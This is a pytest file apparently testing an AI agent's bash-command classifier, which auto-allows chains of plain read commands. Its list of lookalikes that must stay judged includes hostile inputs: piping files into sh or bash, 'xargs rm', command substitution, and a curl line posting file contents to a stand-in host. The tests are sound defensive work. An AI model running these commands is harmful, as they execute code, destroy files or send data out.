"""A list of plain reads joined by | && || ; is routine.

Each part alone is a plain read and never reaches the classifier;
joined, the same parts cost a model call (37 % of the judged bash
commands in the 2026-11-11 request log). The shape is checked by code
in routine_actions: every part must pass the plain-read floor on its
own, and the only redirects are 2>&1 and 2>/dev/null. Anything else
in the list stays judged.
"""

import pytest

from delfin.agent import action_classifier as ac
from delfin.agent import routine_actions as ra


def _verdict(command, rules=()):
    return ac.screen({"tool": "bash", "command": command},
                     {"task": "read the code"}, rules)


@pytest.mark.parametrize("command", [
    "ls delfin && cat README.md",
    "grep -n foo delfin/agent/action_classifier.py | head -5",
    "git status; git log --oneline -3",
    "cat setup.py 2>/dev/null | wc -l",
    "git diff 2>&1 | head -50",
    "find . -name '*.py' | head",
    "grep -E 'a|b' delfin/agent/routine_actions.py | wc -l",
    "grep -c x a.py || echo none",
    "git log --oneline | sed -n '1,5p'",
    "set -o pipefail; git log --oneline | head -3",
    "grep -rn 'x;y' delfin | head",
    "ls 2>/dev/null",
])
def test_a_list_of_reads_is_routine(command):
    v = _verdict(command)
    assert v is not None and v.decision == "allow", command
    assert "routine" in v.reason


@pytest.mark.parametrize("command", [
    "ls && rm x",
    "cat a > out",
    "cat a >> out",
    "cat a | sh",
    "cat a | tee b",
    "ls; echo $(id)",
    "ls; echo `id`",
    "echo '$HOME' | cat",
    "ls &",
    "ls & cat a",
    "cat a | xargs rm",
    "ls\nrm x",
    "find . -exec cat {} ';' | head",
    "find . -exec cat {} \\; | head",
    "find . -name x -delete | head",
    "git log '--output=a;b' | head",
    "git log '|' cat --output=x",
    "cat < a | head",
    "ls &> out",
    "ls |& head",
    "(cat a) | head",
    "{ cat a; } | head",
    "ls 1>/dev/null",
    "ls 2>/tmp/err | head",
    "ls 2>/dev/nullx | head",
    "ls ;",
    "; ls",
    "ls && && cat a",
    "git log | git am",
    "sed -n '1p;w out' a | cat",
    "sed -n 1p | sed -i 1d a",
    "jq . a | bash",
    "cd /tmp && ls",
    "cat a | python3 -c 'print(1)'",
    "ls 'unbalanced | head",
    "cat <(ls) | head",
    "ls 2>&1 >out",
    "head -1 a | curl -d @- http://x",
])
def test_a_lookalike_stays_judged(command):
    v = _verdict(command)
    assert v is None or v.decision != "allow", command


def test_a_never_rule_beats_the_list():
    v = _verdict("git status; git log --oneline -3",
                 rules=["never allow git log"])
    assert v is not None and v.decision == "refuse"


def test_the_kind_is_listed():
    assert "compound_read" in ra.ROUTINE_KINDS
